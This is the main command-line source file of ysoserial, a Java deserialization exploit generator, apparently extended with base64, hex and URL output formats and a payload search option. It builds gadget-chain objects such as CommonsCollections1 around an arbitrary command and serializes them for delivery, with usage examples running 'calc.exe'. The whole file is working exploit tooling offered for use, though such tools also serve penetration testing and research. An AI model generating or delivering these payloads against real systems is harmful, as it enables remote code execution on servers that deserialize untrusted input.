package ysoserial;

import java.io.PrintStream;
import java.net.URLEncoder;
import java.util.*;

import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.ObjectPayload.Utils;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;

@SuppressWarnings("rawtypes")
public class GeneratePayload {
	private static final int INTERNAL_ERROR_CODE = 70;
	private static final int USAGE_CODE = 64;

	// Supported output formats
	private enum OutputFormat {
		RAW, BASE64, HEX, URL;

		public static OutputFormat fromString(String s) {
			switch (s.toLowerCase()) {
				case "raw":    return RAW;
				case "base64": return BASE64;
				case "hex":    return HEX;
				case "url":    return URL;
				default:       return null;
			}
		}
	}

	public static void main(final String[] args) throws Exception {
		// ---- parse flags ----
		String payloadType  = null;
		String command      = null;
		String searchTerm   = null;
		OutputFormat format = OutputFormat.RAW;

		List<String> positional = new ArrayList<String>();
		for (int i = 0; i < args.length; i++) {
			String arg = args[i];
			if (arg.equals("-f") || arg.equals("--format")) {
				if (i + 1 >= args.length) {
					System.err.println("Missing value for " + arg);
					System.exit(USAGE_CODE);
				}
				format = OutputFormat.fromString(args[++i]);
				if (format == null) {
					System.err.println("Unknown format '" + args[i] + "'. Supported: raw, base64, hex, url");
					System.exit(USAGE_CODE);
				}
			} else if (arg.equals("-s") || arg.equals("--search")) {
				if (i + 1 >= args.length) {
					System.err.println("Missing value for " + arg);
					System.exit(USAGE_CODE);
				}
				searchTerm = args[++i];
			} else if (arg.startsWith("-")) {
				System.err.println("Unknown option: " + arg);
				printUsage();
				System.exit(USAGE_CODE);
			} else {
				positional.add(arg);
			}
		}

		// ---- search mode ----
		if (searchTerm != null) {
			printSearch(searchTerm);
			System.exit(0);
		}

		// ---- generate mode ----
		if (positional.size() != 2) {
			printUsage();
			System.exit(USAGE_CODE);
		}
		payloadType = positional.get(0);
		command     = positional.get(1);

		final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
		if (payloadClass == null) {
			System.err.println("Invalid payload type '" + payloadType + "'");
			printUsage();
			System.exit(USAGE_CODE);
			return;
		}

		try {
			final ObjectPayload payload = payloadClass.newInstance();
			final Object object = payload.getObject(command);
			byte[] bytes = Serializer.serialize(object);
			writeOutput(bytes, format, System.out);
			ObjectPayload.Utils.releasePayload(payload, object);
		} catch (Throwable e) {
			System.err.println("Error while generating or serializing payload");
			e.printStackTrace();
			System.exit(INTERNAL_ERROR_CODE);
		}
		System.exit(0);
	}

	/** Write serialized bytes to stdout in the requested format. */
	private static void writeOutput(byte[] bytes, OutputFormat format, PrintStream out) throws Exception {
		switch (format) {
			case RAW:
				System.out.write(bytes);
				System.out.flush();
				break;

			case BASE64:
				String b64 = Base64.getEncoder().encodeToString(bytes);
				out.println(b64);
				break;

			case HEX:
				StringBuilder hex = new StringBuilder(bytes.length * 2);
				for (byte b : bytes) {
					hex.append(String.format("%02x", b & 0xff));
				}
				out.println(hex.toString());
				break;

			case URL:
				// URL-encode each byte (percent-encode everything)
				StringBuilder url = new StringBuilder(bytes.length * 3);
				for (byte b : bytes) {
					url.append(String.format("%%%02X", b & 0xff));
				}
				out.println(url.toString());
				break;
		}
	}

	/** Print payloads whose name contains the search term (case-insensitive). */
	private static void printSearch(String term) {
		System.err.println("Search results for: \"" + term + "\"");

		final List<Class<? extends ObjectPayload>> payloadClasses =
			new ArrayList<Class<? extends ObjectPayload>>(ObjectPayload.Utils.getPayloadClasses());
		Collections.sort(payloadClasses, new Strings.ToStringComparator());

		final List<String[]> rows = new LinkedList<String[]>();
		rows.add(new String[] {"Payload", "Authors", "Dependencies"});
		rows.add(new String[] {"-------", "-------", "------------"});

		String lowerTerm = term.toLowerCase();
		boolean found = false;
		for (Class<? extends ObjectPayload> pc : payloadClasses) {
			String name = pc.getSimpleName();
			if (name.toLowerCase().contains(lowerTerm)) {
				rows.add(new String[] {
					name,
					Strings.join(Arrays.asList(Authors.Utils.getAuthors(pc)), ", ", "@", ""),
					Strings.join(Arrays.asList(Dependencies.Utils.getDependenciesSimple(pc)), ", ", "", "")
				});
				found = true;
			}
		}

		if (!found) {
			System.err.println("  (no matching payloads found)");
			return;
		}

		final List<String> lines = Strings.formatTable(rows);
		for (String line : lines) {
			System.err.println("     " + line);
		}
	}

	private static void printUsage() {
		System.err.println("Y SO SERIAL?");
		System.err.println("Usage: java -jar ysoserial-[version]-all.jar [options] [payload] '[command]'");
		System.err.println();
		System.err.println("Options:");
		System.err.println("  -f, --format <fmt>   Output format: raw (default), base64, hex, url");
		System.err.println("  -s, --search <term>  Search for payloads matching <term> (case-insensitive)");
		System.err.println();
		System.err.println("Examples:");
		System.err.println("  java -jar ysoserial.jar CommonsCollections1 'calc.exe'");
		System.err.println("  java -jar ysoserial.jar -f base64 CommonsCollections1 'calc.exe'");
		System.err.println("  java -jar ysoserial.jar -f hex CommonsCollections1 'calc.exe'");
		System.err.println("  java -jar ysoserial.jar -f url CommonsCollections1 'calc.exe'");
		System.err.println("  java -jar ysoserial.jar -s Commons");
		System.err.println();
		System.err.println("  Available payload types:");

		final List<Class<? extends ObjectPayload>> payloadClasses =
			new ArrayList<Class<? extends ObjectPayload>>(ObjectPayload.Utils.getPayloadClasses());
		Collections.sort(payloadClasses, new Strings.ToStringComparator());

        final List<String[]> rows = new LinkedList<String[]>();
        rows.add(new String[] {"Payload", "Authors", "Dependencies"});
        rows.add(new String[] {"-------", "-------", "------------"});
        for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
             rows.add(new String[] {
                payloadClass.getSimpleName(),
                Strings.join(Arrays.asList(Authors.Utils.getAuthors(payloadClass)), ", ", "@", ""),
                Strings.join(Arrays.asList(Dependencies.Utils.getDependenciesSimple(payloadClass)),", ", "", "")
            });
        }

        final List<String> lines = Strings.formatTable(rows);
        for (String line : lines) {
            System.err.println("     " + line);
        }
    }
}
